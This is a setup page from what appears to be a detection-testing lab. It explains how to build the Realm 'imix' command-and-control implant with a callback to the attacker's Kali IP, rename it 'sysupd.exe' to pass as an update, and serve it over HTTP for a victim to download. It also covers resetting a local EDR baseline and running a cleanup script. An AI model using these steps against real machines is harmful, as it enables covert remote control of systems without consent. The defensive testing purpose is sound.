# Shared: Building the imix implant on Kali (referenced by every walkthrough)

All technique walkthroughs need the same two artifacts. Build them once, reuse everywhere.

## One-time tooling

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
cargo install cargo-zigbuild
sudo apt update && sudo apt install -y golang mingw-w64
```

## Clone Realm + start Tavern (terminal 1, leave running)

```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern
```

## Build the implant (terminal 2) — IP is baked in, get it right

```bash
cd ~/realm/implants/imix
IMIX_CALLBACK_URI=http://<KALI_IP>:8080 cargo build --release   # <- your Kali IP
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

Useful variants (optional):
```bash
cargo build --release --features win_service && cp target/release/imix.exe ~/sideload-lab/imix_svc.exe
```

## Serve to the victim

```bash
cd ~/sideload-lab && python3 -m http.server 8000
# victim pulls from http://<KALI_IP>:8000/sysupd.exe
```

## On the victim before every test

```powershell
# EDR running (python -m edr from the repo root) + fresh baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 (LIVE panel = alerts)
```

## After every test

```powershell
# global cleanup removes every artifact any walkthrough creates:
C:\Users\Administrator\Desktop\CCDC-EDR-SIEM-design\poc-scripts\victim\05-full-cleanup.ps1
```
